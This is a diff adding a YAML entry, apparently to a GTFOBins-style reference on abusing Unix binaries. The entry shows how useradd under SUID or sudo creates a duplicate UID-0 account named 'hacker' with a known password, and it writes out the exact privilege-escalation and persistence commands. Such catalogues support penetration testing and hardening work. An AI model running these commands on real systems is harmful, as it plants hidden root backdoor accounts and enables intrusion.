@@ -1,0 +1,21 @@
+---
+functions:
+  shell:
+    - comment: >
+        If the binary has the SUID bit set, it does not drop elevated
+        privileges. By creating a new user with UID 0 using `-u 0` (root UID)
+        and `-o` (allow non-unique/duplicate UIDs, bypassing the uniqueness
+        check since root already holds UID 0), the new account gains full
+        root privileges without modifying the existing root account, providing
+        both privilege escalation and persistence.
+      contexts:
+        suid:
+          system: false
+          code: |
+            useradd -o -u 0 hacker -p $(openssl passwd -1 password)
+            su hacker
+        sudo:
+          code: |
+            sudo useradd -o -u 0 hacker -p $(openssl passwd -1 password)
+            su hacker
+...
